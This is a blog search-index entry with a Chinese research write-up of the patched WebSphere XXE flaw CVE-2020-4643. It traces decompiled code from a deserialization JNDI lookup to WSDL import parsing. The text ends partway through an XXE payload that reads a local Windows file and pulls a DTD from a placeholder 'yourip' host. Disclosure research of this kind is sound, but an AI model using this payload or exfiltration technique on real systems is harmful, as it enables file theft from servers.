<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>WebSphere XXE 漏洞分析(CVE-2020-4643)</title>
      <link href="/WebSphere%20XXE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-4643).html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p></blockquote><h3 id="WebSphere-XXE漏洞分析-CVE-2020-4643"><a href="#WebSphere-XXE漏洞分析-CVE-2020-4643" class="headerlink" title="WebSphere XXE漏洞分析(CVE-2020-4643)"></a>WebSphere XXE漏洞分析(CVE-2020-4643)</h3><p><strong>作者：Longofo@知道创宇404实验室 &amp; r00t4dm@奇安信A-TEAM</strong></p><p><strong>时间：2020年9月21日</strong></p><p>2020年9月17日，IBM发布了一个WebSphere XXE<a href="https://www.ibm.com/support/pages/security-bulletin-websphere-application-server-vulnerable-information-exposure-vulnerability-cve-2020-4643" target="_blank" rel="noopener">漏洞公告</a>。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p><h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p>先来看看补丁，只能看出是修复了一个XXE，不知道是哪儿的XXE：</p><p><img src="images/CVE-2020-4643/1.png" alt=""></p><p>可以看出这里是修复了一个XXE漏洞，但是这只是一个Utils，我们找到的那个XXE刚好也用了这个Utils。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>最开始研究WebSphere就是前不久的CVE-2020-4450，这个漏洞外面已经有分析了。为了更熟悉一点WebSphere，我们也去研究了历史补丁，例如印象比较深的就是前不久的CVE-2020-4276，这个漏洞算是历史漏洞CVE-2015-7450的认证方式绕过，RCE的过程与CVE-2015-7450没区别。后面意外的找到另一个反序列化入口，在确认了已经无法在历史漏洞上做文章的时，只好从readObject、readExternal、toString、compare等函数去尝试找下了，后来在一个readObject找到一个能JNDI注入的地方，但是由于sdk高版本的原因，能利用的方式就只能是本地factory或利用jndi本地反序列化了，但是WebSphere公开的利用链都被堵上了，本地反序列化其实没什么作用在这里，所以只剩下看本地Factory了。反序列化入口暂时先不给出，可能这样的反序列化入口还有很多，我们碰巧遇到了其中一个，如果后面有幸找到了RCE漏洞，就把我们找到的入口写出来，下面从那个readObject中的JNDI开始吧。</p><p>在<code>com.ibm.ws.ejb.portable.EJBMetaDataImpl#readObject</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">this</span>.ivStatelessSession = in.readBoolean();</span><br><span class="line">            ClassLoader loader = (ClassLoader)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">this</span>.ivBeanClassName = in.readUTF();</span><br><span class="line">            <span class="keyword">this</span>.ivHomeClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">this</span>.ivRemoteClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.ivSession) &#123;</span><br><span class="line">                <span class="keyword">this</span>.ivPKClass = loader.loadClass(in.readUTF());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ivHomeHandle = (HomeHandle)in.readObject();</span><br><span class="line">            EJBHome ejbHomeStub = <span class="keyword">this</span>.ivHomeHandle.getEJBHome();<span class="comment">//ivHomeHandle是一个接口，我们找到了HomeHandleImpl，里面进行了JNDI查询，并且url可控</span></span><br><span class="line">            <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ejbHomeStub, <span class="keyword">this</span>.ivHomeClass);<span class="comment">//如果跟踪过CVE-2020-4450就能感觉到，这里十分类似CVE-2020-4450，不过缺少了后续的调用，无法像CVE-2020-4450利用WSIF的方式触发后续的RCE，WSIF之前那个XXE也被修复了</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.ws.ejb.portable.HomeHandleImpl#getEJBHome</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> EJBHome <span class="title">getEJBHome</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ivEjbHome == <span class="keyword">null</span>) &#123;</span><br><span class="line">            NoSuchObjectException re;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">                InitialContext ctx;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.ivInitialContextProperties == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.ivInitialContextProperties);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);<span class="comment">//进行了JNDI查询，ivJndiName是属性，很容易控制</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoInitialContextException var6) &#123;</span><br><span class="line">                    Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">                    p.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span>);</span><br><span class="line">                    ctx = <span class="keyword">new</span> InitialContext(p);</span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);</span><br><span class="line">                &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ivEjbHome;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果是sdk低版本，直接就是外部加载factory rce利用了，但是天不随人愿，如果这么容易就不会有CVE-2020-4450那种复杂的利用了。</p><p>接下来就只能一个一个看本地的factory了，也不多大概几十个，一个一个看吧。在<code>com.ibm.ws.webservices.engine.client.ServiceFactory#getObjectInstance</code>中，找到了那个XXE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object refObject, Name name, Context nameCtx, Hashtable environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refObject <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            Reference ref = (Reference)refObject;</span><br><span class="line">            RefAddr addr = ref.get(<span class="string">"service classname"</span>);</span><br><span class="line">            Object obj = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                instance = ClassUtils.forName((String)obj).newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                addr = ref.get(<span class="string">"WSDL location"</span>);</span><br><span class="line">                <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    URL wsdlLocation = <span class="keyword">new</span> URL((String)obj);</span><br><span class="line">                    addr = ref.get(<span class="string">"service namespace"</span>);</span><br><span class="line">                    <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                        String namespace = (String)obj;</span><br><span class="line">                        addr = ref.get(<span class="string">"service local part"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                            String localPart = (String)obj;</span><br><span class="line">                            QName serviceName = QNameTable.createQName(namespace, localPart);</span><br><span class="line">                            Class[] formalArgs = <span class="keyword">new</span> Class[]&#123;URL.class, QName.class&#125;;</span><br><span class="line">                            Object[] actualArgs = <span class="keyword">new</span> Object[]&#123;wsdlLocation, serviceName&#125;;</span><br><span class="line">                            Constructor ctor = Service.class.getDeclaredConstructor(formalArgs);</span><br><span class="line">                            instance = ctor.newInstance(actualArgs);<span class="comment">//调用了Service构造函数</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            addr = ref.get(<span class="string">"maintain session"</span>);</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; instance <span class="keyword">instanceof</span> Service) &#123;</span><br><span class="line">                ((Service)instance).setMaintainSession(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.ws.webservices.engine.client.Service#Service(java.net.URL, javax.xml.namespace.QName)</code>，在构造函数中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Service</span><span class="params">(URL wsdlLocation, QName serviceName)</span> <span class="keyword">throws</span> ServiceException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Entry Service(URL, QName)  "</span> + serviceName.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.serviceName = serviceName;</span><br><span class="line">        <span class="keyword">this</span>.wsdlLocation = wsdlLocation;</span><br><span class="line">        Definition def = cachingWSDL ? (Definition)cachedWSDL.get(wsdlLocation.toString()) : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (def == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Document doc = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                doc = XMLUtils.newDocument(wsdlLocation.toString());<span class="comment">//wsdlLocation外部可控，这里XMLUtils.newDocument进去就请求了wsdlLocation获取xml文件并解析</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                FFDCFilter.processException(var8, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"199"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var8));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                WSDLFactory factory = <span class="keyword">new</span> WSDLFactoryImpl();</span><br><span class="line">                WSDLReader reader = factory.newWSDLReader();</span><br><span class="line">                reader.setFeature(<span class="string">"javax.wsdl.verbose"</span>, <span class="keyword">false</span>);</span><br><span class="line">                def = reader.readWSDL(wsdlLocation.toString(), doc);<span class="comment">//一开始我们只停留在了上面那个XMLUtils.newDocument，利用那儿的异常带不出去数据，由于是高版本sdk，外带也只能带一行数据。后来看到reader.readWSDL进去还能利用另一种方式外带全部数据</span></span><br><span class="line">                <span class="keyword">if</span> (cachingWSDL) &#123;</span><br><span class="line">                    cachedWSDL.put(wsdlLocation.toString(), def);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                FFDCFilter.processException(var7, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"293"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var7));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.initService(def);</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Exit Service(URL, QName)  "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.wsdl.xml.WSDLReaderImpl#readWSDL(java.lang.String, org.w3c.dom.Document)</code>之后，会调用到一个<code>com.ibm.wsdl.xml.WSDLReaderImpl#parseDefinitions</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Definition <span class="title">parseDefinitions</span><span class="params">(String documentBaseURI, Element defEl, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">    checkElementName(defEl, Constants.Q_ELEM_DEFINITIONS);</span><br><span class="line">    WSDLFactory factory = <span class="keyword">this</span>.getWSDLFactory();</span><br><span class="line">    Definition def = factory.newDefinition();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.extReg != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setExtensionRegistry(<span class="keyword">this</span>.extReg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = DOMUtils.getAttribute(defEl, <span class="string">"name"</span>);</span><br><span class="line">    String targetNamespace = DOMUtils.getAttribute(defEl, <span class="string">"targetNamespace"</span>);</span><br><span class="line">    NamedNodeMap attrs = defEl.getAttributes();</span><br><span class="line">    <span class="keyword">if</span> (importedDefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        importedDefs = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (documentBaseURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setDocumentBaseURI(documentBaseURI);</span><br><span class="line">        ((Map)importedDefs).put(documentBaseURI, def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setQName(<span class="keyword">new</span> QName(targetNamespace, name));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (targetNamespace != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setTargetNamespace(targetNamespace);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> size = attrs.getLength();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        Attr attr = (Attr)attrs.item(i);</span><br><span class="line">        String namespaceURI = attr.getNamespaceURI();</span><br><span class="line">        String localPart = attr.getLocalName();</span><br><span class="line">        String value = attr.getValue();</span><br><span class="line">        <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span> &amp;&amp; namespaceURI.equals(<span class="string">"http://www.w3.org/2000/xmlns/"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (localPart != <span class="keyword">null</span> &amp;&amp; !localPart.equals(<span class="string">"xmlns"</span>)) &#123;</span><br><span class="line">                def.addNamespace(localPart, value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                def.addNamespace((String)<span class="keyword">null</span>, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Element tempEl = DOMUtils.getFirstChildElement(defEl); tempEl != <span class="keyword">null</span>; tempEl = DOMUtils.getNextSiblingElement(tempEl)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_IMPORT, tempEl)) &#123;</span><br><span class="line">            def.addImport(<span class="keyword">this</span>.parseImport(tempEl, def, (Map)importedDefs));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_DOCUMENTATION, tempEl)) &#123;</span><br><span class="line">            def.setDocumentationElement(tempEl);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_TYPES, tempEl)) &#123;</span><br><span class="line">            def.setTypes(<span class="keyword">this</span>.parseTypes(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_MESSAGE, tempEl)) &#123;</span><br><span class="line">            def.addMessage(<span class="keyword">this</span>.parseMessage(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_PORT_TYPE, tempEl)) &#123;</span><br><span class="line">            def.addPortType(<span class="keyword">this</span>.parsePortType(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_BINDING, tempEl)) &#123;</span><br><span class="line">            def.addBinding(<span class="keyword">this</span>.parseBinding(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_SERVICE, tempEl)) &#123;</span><br><span class="line">            def.addService(<span class="keyword">this</span>.parseService(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            def.addExtensibilityElement(<span class="keyword">this</span>.parseExtensibilityElement(Definition.class, tempEl, def));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.parseExtensibilityAttributes(defEl, Definition.class, def, def);</span><br><span class="line">    <span class="keyword">return</span> def;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.ibm.wsdl.xml.WSDLReaderImpl#parseImport</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Import <span class="title">parseImport</span><span class="params">(Element importEl, Definition def, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">        Import importDef = def.createImport();</span><br><span class="line"></span><br><span class="line">        String locationURI;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String namespaceURI = DOMUtils.getAttribute(importEl, <span class="string">"namespace"</span>);</span><br><span class="line">            locationURI = DOMUtils.getAttribute(importEl, <span class="string">"location"</span>);<span class="comment">//获取location属性</span></span><br><span class="line">            String contextURI = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setNamespaceURI(namespaceURI);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (locationURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setLocationURI(locationURI);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.importDocuments) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        contextURI = def.getDocumentBaseURI();</span><br><span class="line">                        Definition importedDef = <span class="keyword">null</span>;</span><br><span class="line">                        InputStream inputStream = <span class="keyword">null</span>;</span><br><span class="line">                        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line">                        URL url = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.loc != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            inputSource = <span class="keyword">this</span>.loc.getImportInputSource(contextURI, locationURI);</span><br><span class="line">                            String liu = <span class="keyword">this</span>.loc.getLatestImportURI();</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(liu);</span><br><span class="line">                            <span class="keyword">if</span> (inputSource.getSystemId() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputSource.setSystemId(liu);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            URL contextURL = contextURI != <span class="keyword">null</span> ? StringUtils.getURL((URL)<span class="keyword">null</span>, contextURI) : <span class="keyword">null</span>;</span><br><span class="line">                            url = StringUtils.getURL(contextURL, locationURI);</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(url.toString());</span><br><span class="line">                            <span class="keyword">if</span> (importedDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputStream = StringUtils.getContentAsInputStream(url);<span class="comment">//进行了请求，可以通过这个请求将数据外带，但是还是有些限制，例如有&amp;或"等字符的文件会报错导致带不了</span></span><br><span class="line">                                ...</span><br><span class="line">                                ...</span><br></pre></td></tr></table></figure><p>xml payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xml如下：</span><br><span class="line">&lt;!DOCTYPE x [</span><br><span class="line">  &lt;!ENTITY % aaa SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % bbb SYSTEM &quot;http://yourip:8000/xx.dtd&quot;&gt;</span><br><span class="line">  %bbb;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;definitions name=&quot;HelloService&quot; xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class="line">  &amp;ddd;</span><br><span class="line">&lt;/definitions&gt;</span><br><span class="line"></span><br><span 